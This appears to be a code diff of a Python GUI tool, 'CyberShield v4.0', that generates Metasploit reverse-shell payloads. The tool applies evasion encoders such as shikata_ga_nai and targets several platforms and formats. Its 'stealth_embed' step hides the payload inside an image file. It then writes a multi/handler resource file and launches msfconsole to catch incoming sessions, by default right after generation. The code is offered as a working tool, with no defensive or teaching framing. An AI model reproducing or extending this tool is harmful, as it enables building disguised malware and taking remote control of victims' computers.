@@ -1,222 +1,374 @@
-# core/main_app.py
+# main.py
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox
-from PIL import Image, ImageTk
 import os
 import platform
+import subprocess
+import tempfile
+from PIL import Image, ImageTk
 from core.security_manager import SecurityManager
-from core.ui_components import SecureConsole, KeyManagerUI, ImagePreview
 from core.advanced_operations import AdvancedOperations
+from core.ui_components import SecureConsole, KeyManagerUI, ImagePreview, PayloadConfigUI, ReverseConfigUI
 
 class CyberShieldApp:
     def __init__(self, root):
         self.root = root
-        self.root.title("CyberShield v3.0 - Advanced Payload Embedder")
-        self.root.geometry("1200x800")
-        self.style = ttk.Style()
-        self.style.theme_use('clam')
+        self.root.title("CyberShield v4.0 - Advanced Payload Platform")
+        self.root.geometry("1400x900")
+        
+        # Initialize state variables
+        self.payload_path = ""
+        self.image_path = ""
+        self.output_path = ""
+        self.output_type = tk.StringVar(value="exe")
         
         # Initialize core components
         self.security = SecurityManager()
         self.operations = AdvancedOperations(self.security)
         self.current_platform = platform.system()
+        self.listener_process = None
         
-        # Initialize state
-        self.payload_path = ""
-        self.image_path = ""
-        self.output_path = ""
-        self.output_type = tk.StringVar(value="jpg")
-        
-        self.configure_styles()
-        self.create_widgets()
+        # Initialize console first
+        self.console = None
+        self.create_widgets()  # This will initialize the console
         self.create_menu()
         
-        # Security initialization
-        self.security.generate_keys()
-        self.operations.enable_anti_forensics()
+        try:
+            self.security.generate_keys()
+            self.console.log("Security keys generated successfully", 'success')
+        except Exception as e:
+            self.console.log(f"Key generation error: {str(e)}", 'error')
 
     def configure_styles(self):
-        """Modern UI styling"""
-        self.style.configure('TButton', font=('Helvetica', 12), padding=10)
-        self.style.configure('Title.TLabel', font=('Helvetica', 16, 'bold'))
-        self.style.map('Action.TButton',
-            foreground=[('active', 'white'), ('disabled', 'gray')],
-            background=[('active', '#45a049'), ('disabled', '#cccccc')]
-        )
+        """Modern UI styling with security colors"""
+        self.style = ttk.Style()
+        self.style.theme_use('clam')
+        self.style.configure('TNotebook.Tab', font=('Helvetica', 10, 'bold'))
+        self.style.configure('Danger.TButton', foreground='white', background='#dc3545')
+        self.style.configure('Success.TButton', foreground='white', background='#28a745')
+        self.style.configure('TLabelFrame', font=('Helvetica', 10, 'bold'))
+        self.style.configure('Title.TLabel', font=('Helvetica', 12, 'bold'))
 
     def create_widgets(self):
-        """Modern responsive UI layout"""
+        self.configure_styles()
+        
+        # Main container
         main_frame = ttk.Frame(self.root)
         main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
         
-        # File Selection Section
-        file_frame = ttk.LabelFrame(main_frame, text="File Operations")
-        file_frame.grid(row=0, column=0, sticky='nsew', padx=10, pady=10)
-        
-        ttk.Button(file_frame, text="📤 Upload Payload", 
-                 command=self.load_payload, style='Action.TButton').grid(row=0, column=0, padx=5, pady=5)
-        self.payload_label = ttk.Label(file_frame, text="No payload selected")
-        self.payload_label.grid(row=0, column=1, padx=5)
-        
-        ttk.Button(file_frame, text="🖼️ Upload Image", 
-                 command=self.load_image, style='Action.TButton').grid(row=1, column=0, padx=5, pady=5)
-        self.image_label = ttk.Label(file_frame, text="No image selected")
-        self.image_label.grid(row=1, column=1, padx=5)
-        
-        # Output Type Selection
-        output_frame = ttk.LabelFrame(main_frame, text="Output Configuration")
-        output_frame.grid(row=2, column=0, sticky='ew', padx=10, pady=10)
-        
-        ttk.Radiobutton(output_frame, text="JPG Output", variable=self.output_type, 
-                      value="jpg").grid(row=0, column=0, padx=10)
-        ttk.Radiobutton(output_frame, text="Executable Output", variable=self.output_type,
-                      value="exe").grid(row=0, column=1, padx=10)
-        
-        # Action Buttons
-        action_frame = ttk.Frame(main_frame)
-        action_frame.grid(row=3, column=0, pady=20)
-        
-        self.generate_btn = ttk.Button(action_frame, text="🛠️ Generate", 
-                                    command=self.process_files, state=tk.DISABLED)
-        self.generate_btn.pack(side=tk.LEFT, padx=5)
-        
-        self.download_btn = ttk.Button(action_frame, text="💾 Download", 
-                                     command=self.save_file, state=tk.DISABLED)
-        self.download_btn.pack(side=tk.LEFT, padx=5)
-        
-        # Image Preview Section
-        preview_frame = ttk.LabelFrame(main_frame, text="Image Preview")
-        preview_frame.grid(row=0, column=1, rowspan=4, sticky='nsew', padx=10, pady=10)
-        self.preview = ImagePreview(preview_frame)
-        self.preview.pack(fill=tk.BOTH, expand=True)
-        
-        # Security Management
-        security_frame = ttk.LabelFrame(main_frame, text="Key Management")
-        security_frame.grid(row=4, column=0, columnspan=2, sticky='ew', padx=10, pady=10)
-        self.key_manager = KeyManagerUI(security_frame, self.security)
-        
-        # Console Output
-        console_frame = ttk.LabelFrame(main_frame, text="Operation Log")
-        console_frame.grid(row=5, column=0, columnspan=2, sticky='nsew', padx=10, pady=10)
+        # Left panel (configuration)
+        left_panel = ttk.Frame(main_frame, width=400)
+        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False)
+
+        # Right panel (preview and console)
+        right_panel = ttk.Frame(main_frame)
+        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+
+        # ===== CONSOLE (initialize first) =====
+        console_frame = ttk.LabelFrame(right_panel, text="Operation Console", padding=10)
+        console_frame.pack(fill=tk.BOTH, expand=True, pady=5)
         self.console = SecureConsole(console_frame)
         self.console.pack(fill=tk.BOTH, expand=True)
+        self.console.log("Application initialized", 'info')
+
+        # ========== PAYLOAD CONFIGURATION ==========
+        config_frame = ttk.LabelFrame(left_panel, text="Payload Configuration", padding=10)
+        config_frame.pack(fill=tk.BOTH, expand=True, pady=5)
+
+        # Main configuration notebook
+        config_notebook = ttk.Notebook(config_frame)
+        config_notebook.pack(fill=tk.BOTH, expand=True)
+
+        # 1. Basic Payload Settings Tab
+        basic_frame = ttk.Frame(config_notebook)
+        self.payload_config = PayloadConfigUI(basic_frame, self.console)
+        self.payload_config.pack(fill=tk.BOTH, expand=True)
+        config_notebook.add(basic_frame, text="Basic Settings")
+
+        # 2. Advanced Encoding Tab
+        encoding_frame = ttk.Frame(config_notebook)
         
-        # Configure grid weights
-        main_frame.columnconfigure(1, weight=1)
-        main_frame.rowconfigure(5, weight=1)
+        # Encoding options
+        ttk.Label(encoding_frame, text="Encoder:", style='Title.TLabel').grid(row=0, column=0, sticky='w', pady=5)
+        self.encoder_var = tk.StringVar()
+        encoders = ["x86/shikata_ga_nai", "x86/countdown", "cmd/powershell_base64", "x64/xor", "php/base64"]
+        encoder_combo = ttk.Combobox(encoding_frame, textvariable=self.encoder_var, values=encoders, state='readonly')
+        encoder_combo.grid(row=0, column=1, sticky='ew', padx=5, pady=5)
+        encoder_combo.current(0)
 
-    def create_menu(self):
-        """Modern menu system"""
-        menubar = tk.Menu(self.root)
-        file_menu = tk.Menu(menubar, tearoff=0)
-        file_menu.add_command(label="New Session", command=self.reset_session)
-        file_menu.add_separator()
-        file_menu.add_command(label="Exit", command=self.root.quit)
-        menubar.add_cascade(label="File", menu=file_menu)
-        self.root.config(menu=menubar)
+        ttk.Label(encoding_frame, text="Iterations:", style='Title.TLabel').grid(row=1, column=0, sticky='w', pady=5)
+        self.iterations_var = tk.IntVar(value=3)
+        ttk.Spinbox(encoding_frame, from_=1, to=10, textvariable=self.iterations_var).grid(row=1, column=1, sticky='ew', padx=5, pady=5)
 
-    def load_payload(self):
-        """Load any type of payload file"""
-        file_types = [
-            ('Metasploit Payloads', '*.exe *.elf *.dll *.bin *.py *.jar'),
-            ('All files', '*.*')
-        ]
-        path = filedialog.askopenfilename(title="Select Payload File", filetypes=file_types)
-        if path:
-            self.payload_path = path
-            self.payload_label.config(text=os.path.basename(path))
-            self.update_button_states()
-            self.log(f"Payload loaded: {path}")
+        ttk.Label(encoding_frame, text="Bad Characters:", style='Title.TLabel').grid(row=2, column=0, sticky='w', pady=5)
+        self.badchars_var = tk.StringVar(value="\\x00\\x0a\\x0d")
+        ttk.Entry(encoding_frame, textvariable=self.badchars_var).grid(row=2, column=1, sticky='ew', padx=5, pady=5)
+
+        config_notebook.add(encoding_frame, text="Encoding")
+
+        # 3. Platform/Architecture Tab
+        platform_frame = ttk.Frame(config_notebook)
+        
+        # Platform selection
+        ttk.Label(platform_frame, text="Target Platform:", style='Title.TLabel').grid(row=0, column=0, sticky='w', pady=5)
+        self.platform_var = tk.StringVar(value="windows")
+        platforms = ["windows", "linux", "mac", "android", "php", "java"]
+        ttk.Combobox(platform_frame, textvariable=self.platform_var, values=platforms, state='readonly').grid(row=0, column=1, sticky='ew', padx=5, pady=5)
+
+        # Architecture selection
+        ttk.Label(platform_frame, text="Architecture:", style='Title.TLabel').grid(row=1, column=0, sticky='w', pady=5)
+        self.arch_var = tk.StringVar(value="x86")
+        architectures = ["x86", "x64", "arm", "mips", "ppc"]
+        ttk.Combobox(platform_frame, textvariable=self.arch_var, values=architectures, state='readonly').grid(row=1, column=1, sticky='ew', padx=5, pady=5)
+
+        # Output format
+        ttk.Label(platform_frame, text="Output Format:", style='Title.TLabel').grid(row=2, column=0, sticky='w', pady=5)
+        self.format_var = tk.StringVar(value="exe")
+        formats = ["exe", "dll", "elf", "apk", "jar", "ps1", "py", "raw"]
+        ttk.Combobox(platform_frame, textvariable=self.format_var, values=formats, state='readonly').grid(row=2, column=1, sticky='ew', padx=5, pady=5)
+
+        config_notebook.add(platform_frame, text="Platform")
+
+        # ========== LISTENER CONFIGURATION ==========
+        listener_frame = ttk.LabelFrame(left_panel, text="Listener Configuration", padding=10)
+        listener_frame.pack(fill=tk.X, pady=5)
+        
+        self.reverse_config = ReverseConfigUI(listener_frame, self.console)
+        self.reverse_config.pack(fill=tk.X)
+
+        # Auto-start listener option
+        self.auto_listener_var = tk.BooleanVar(value=True)
+        ttk.Checkbutton(listener_frame, text="Auto-start listener after generation", 
+                      variable=self.auto_listener_var).pack(pady=5)
+
+        # ========== FILE OPERATIONS ==========
+        file_frame = ttk.LabelFrame(left_panel, text="File Operations", padding=10)
+        file_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Button(file_frame, text="📤 Upload Template", command=self.load_template).pack(fill=tk.X, pady=2)
+        ttk.Button(file_frame, text="🖼️ Upload Image", command=self.load_image).pack(fill=tk.X, pady=2)
+        ttk.Button(file_frame, text="📂 Select Output Directory", command=self.select_output_dir).pack(fill=tk.X, pady=2)
+
+        # ========== KEY MANAGEMENT ==========
+        key_frame = ttk.LabelFrame(left_panel, text="Cryptographic Controls", padding=10)
+        key_frame.pack(fill=tk.X, pady=5)
+        
+        self.key_manager = KeyManagerUI(key_frame, self.security, self.console)
+        self.key_manager.frame.pack(fill=tk.X)
+
+        # ========== PREVIEW PANEL ==========
+        preview_frame = ttk.LabelFrame(right_panel, text="Payload Preview", padding=10)
+        preview_frame.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        self.preview = ImagePreview(preview_frame, self.console)
+        self.preview.pack(fill=tk.BOTH, expand=True)
+
+        # ========== ACTION BUTTONS ==========
+        action_frame = ttk.Frame(main_frame)
+        action_frame.pack(fill=tk.X, pady=10)
+        
+        ttk.Button(action_frame, text="⚡ Generate Payload", 
+                 command=self.generate_payload, style='Success.TButton').pack(side=tk.LEFT, padx=5)
+        ttk.Button(action_frame, text="📡 Start Listener", 
+                 command=self.start_listener, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
+        ttk.Button(action_frame, text="💾 Save Payload", 
+                 command=self.save_output).pack(side=tk.LEFT, padx=5)
+        ttk.Button(action_frame, text="🔄 Reset Session", 
+                 command=self.reset_session).pack(side=tk.RIGHT, padx=5)
+
+    def select_output_dir(self):
+        """Allow user to select output directory"""
+        dir_path = filedialog.askdirectory()
+        if dir_path:
+            self.output_path = dir_path
+            self.console.log(f"Output directory set to: {dir_path}", 'success')
+
+    def generate_payload(self):
+        """Handle payload generation with current config"""
+        try:
+            config = {
+                "lhost": self.reverse_config.lhost_var.get(),
+                "lport": self.reverse_config.lport_var.get(),
+                "payload": self.payload_config.config['payload_type'].get(),
+                "platform": self.platform_var.get(),
+                "arch": self.arch_var.get(),
+                "encoder": self.encoder_var.get(),
+                "iterations": self.iterations_var.get(),
+                "format": self.format_var.get(),
+                "badchars": self.badchars_var.get()
+            }
+
+            # Validate configuration
+            if not config['lhost']:
+                raise ValueError("LHOST cannot be empty")
+            if not config['lport'].isdigit():
+                raise ValueError("LPORT must be a valid number")
+
+            self.console.log("Starting payload generation...", 'info')
+            
+            # Generate payload
+            payload_path = self.operations.generate_payload(config)
+            self.payload_path = payload_path
+            self.console.log(f"Payload generated: {os.path.basename(payload_path)}", 'success')
+            
+            # Embed in image if selected
+            if self.image_path:
+                output_path = self.operations.stealth_embed(
+                    payload_path, 
+                    self.image_path,
+                    self.security.encryption_key
+                )
+                self.output_path = output_path
+                self.console.log(f"Payload embedded in image: {os.path.basename(output_path)}", 'success')
+                self.show_success_message()
+            else:
+                self.output_path = payload_path
+                self.console.log("Payload generated without image embedding", 'info')
+
+            # Auto-start listener if enabled
+            if self.auto_listener_var.get():
+                self.start_listener()
+
+        except Exception as e:
+            self.console.log(f"Error during payload generation: {str(e)}", 'error')
+            messagebox.showerror("Generation Error", str(e))
+
+    def start_listener(self):
+        """Start Metasploit listener handler"""
+        lhost = self.reverse_config.lhost_var.get()
+        lport = self.reverse_config.lport_var.get()
+        payload = self.payload_config.config['payload_type'].get()
+        
+        try:
+            if not lhost:
+                raise ValueError("LHOST cannot be empty")
+            if not lport.isdigit():
+                raise ValueError("LPORT must be a valid number")
+
+            if self.listener_process and self.listener_process.poll() is None:
+                self.console.log("Listener already running", 'warning')
+                return
+
+            rc_content = f"""use exploit/multi/handler
+set PAYLOAD {payload}
+set LHOST {lhost}
+set LPORT {lport}
+exploit -j
+"""
+            with tempfile.NamedTemporaryFile(delete=False, suffix='.rc') as rc_file:
+                rc_file.write(rc_content.encode())
+            
+            self.listener_process = subprocess.Popen(
+                ["msfconsole", "-q", "-r", rc_file.name],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            self.console.log(f"Listener started on {lhost}:{lport}", 'success')
+            
+        except Exception as e:
+            self.console.log(f"Listener error: {str(e)}", 'error')
+            messagebox.showerror("Listener Error", str(e))
 
     def load_image(self):
-        """Load any image format"""
         img_types = [
-            ('Images', '*.jpg *.jpeg *.png *.bmp *.heic *.webp'),
+            ('Image files', '*.jpg *.jpeg *.png *.bmp *.gif *.webp'),
             ('All files', '*.*')
         ]
-        path = filedialog.askopenfilename(title="Select Carrier Image", filetypes=img_types)
+        path = filedialog.askopenfilename(filetypes=img_types)
         if path:
-            self.image_path = path
-            self.image_label.config(text=os.path.basename(path))
-            self.update_button_states()
-            self.preview.load_image(path)
-            self.log(f"Image loaded: {path}")
+            try:
+                with Image.open(path) as img:
+                    img.verify()
+                    self.image_path = path
+                    self.preview.load_image(path)
+                    self.console.log(f"Image loaded: {os.path.basename(path)}", 'success')
+            except Exception as e:
+                self.console.log(f"Invalid image: {str(e)}", 'error')
+                messagebox.showerror("Image Error", f"Invalid image file: {str(e)}")
 
-    def process_files(self):
-        """Advanced processing with error handling"""
-        try:
-            output_type = self.output_type.get()
-            self.output_path = self.operations.stealth_embed(
-                self.payload_path,
-                self.image_path,
-                output_type=output_type,
-                platform=self.current_platform
-            )
-            self.download_btn.config(state=tk.NORMAL)
-            self.log("Embedding completed successfully")
-            self.show_success_message()
-        except Exception as e:
-            self.log(f"Error: {str(e)}")
-            messagebox.showerror("Processing Error", str(e))
-
-    def save_file(self):
-        """Save the generated file"""
-        default_ext = '.exe' if self.output_type.get() == 'exe' else '.jpg'
+    def load_template(self):
         file_types = [
-            ('Executable' if default_ext == '.exe' else 'JPEG Image', f'*{default_ext}'),
+            ('Template files', '*.exe *.dll *.bin *.raw'),
+            ('All files', '*.*')
+        ]
+        path = filedialog.askopenfilename(filetypes=file_types)
+        if path:
+            self.payload_config.config['template'].set(path)
+            self.console.log(f"Template loaded: {os.path.basename(path)}", 'success')
+
+    def save_output(self):
+        if not self.output_path:
+            self.console.log("No output generated yet", 'warning')
+            messagebox.showwarning("Save Error", "No output generated yet")
+            return
+
+        file_types = [
+            ('Executable', '*.exe'),
+            ('JPEG Image', '*.jpg'),
             ('All files', '*.*')
         ]
         
         path = filedialog.asksaveasfilename(
-            defaultextension=default_ext,
+            defaultextension=".exe",
             filetypes=file_types
         )
         
         if path:
             try:
                 self.operations.save_output(self.output_path, path)
-                self.log(f"File saved to: {path}")
-                messagebox.showinfo("Success", "File saved successfully!")
+                self.console.log(f"File saved to: {path}", 'success')
+                messagebox.showinfo("Success", "File saved successfully")
             except Exception as e:
-                self.log(f"Save error: {str(e)}")
+                self.console.log(f"Save error: {str(e)}", 'error')
                 messagebox.showerror("Save Error", str(e))
 
-    def update_button_states(self):
-        """Enable buttons when ready"""
-        if self.payload_path and self.image_path:
-            self.generate_btn.config(state=tk.NORMAL)
-        else:
-            self.generate_btn.config(state=tk.DISABLED)
+    def create_menu(self):
+        menubar = tk.Menu(self.root)
+        
+        # File menu
+        file_menu = tk.Menu(menubar, tearoff=0)
+        file_menu.add_command(label="New Session", command=self.reset_session)
+        file_menu.add_separator()
+        file_menu.add_command(label="Exit", command=self.root.quit)
+        menubar.add_cascade(label="File", menu=file_menu)
 
-    def show_success_message(self):
-        """Modern success indication"""
-        self.preview.create_text(
-            self.preview.winfo_width()//2,
-            self.preview.winfo_height()//2,
-            text="✅ Embedding Successful!",
-            fill="green",
-            font=('Helvetica', 24, 'bold')
-        )
+        # Tools menu
+        tools_menu = tk.Menu(menubar, tearoff=0)
+        tools_menu.add_command(label="Key Manager", command=self.show_key_manager)
+        menubar.add_cascade(label="Tools", menu=tools_menu)
 
-    def log(self, message):
-        """Console logging with timestamp"""
-        from datetime import datetime
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        self.console.log(f"[{timestamp}] {message}", 'info')
+        # Help menu
+        help_menu = tk.Menu(menubar, tearoff=0)
+        help_menu.add_command(label="About", command=self.show_about)
+        menubar.add_cascade(label="Help", menu=help_menu)
+
+        self.root.config(menu=menubar)
 
     def reset_session(self):
-        """Reset all inputs and outputs"""
         self.payload_path = ""
         self.image_path = ""
         self.output_path = ""
-        self.payload_label.config(text="No payload selected")
-        self.image_label.config(text="No image selected")
-        self.preview.delete("all")
-        self.generate_btn.config(state=tk.DISABLED)
-        self.download_btn.config(state=tk.DISABLED)
-        self.console.configure(state='normal')
-        self.console.delete(1.0, tk.END)
-        self.log("Session reset")
+        self.preview.clear()
+        self.console.log("Session reset", 'info')
+        messagebox.showinfo("Session Reset", "All session data has been cleared")
+
+    def show_key_manager(self):
+        key_window = tk.Toplevel(self.root)
+        key_window.title("Key Management")
+        KeyManagerUI(key_window, self.security, self.console)
+
+    def show_about(self):
+        about_text = "CyberShield v4.0\nAdvanced Payload Platform\n\nSecurity Framework"
+        messagebox.showinfo("About CyberShield", about_text)
+
+    def show_success_message(self):
+        self.preview.create_text(
+            self.preview.winfo_width()//2,
+            self.preview.winfo_height()//2,
+            text="✅ Operation Successful!",
+            fill="green",
+            font=('Helvetica', 24, 'bold')
+        )
 
 if __name__ == "__main__":
     root = tk.Tk()
